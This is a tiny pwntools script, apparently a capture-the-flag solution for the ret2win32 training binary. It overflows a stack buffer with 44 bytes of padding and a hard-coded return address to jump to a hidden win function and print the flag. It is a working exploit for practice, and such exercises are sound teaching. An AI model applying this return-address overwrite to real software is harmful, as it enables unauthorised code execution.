from pwn import *

p = process('./ret2win32')
print p.recvuntil("fgets!\n")
p.sendline("aaaa"*11 + "\x59\x86\x04\x08")
print p.recvuntil("}")
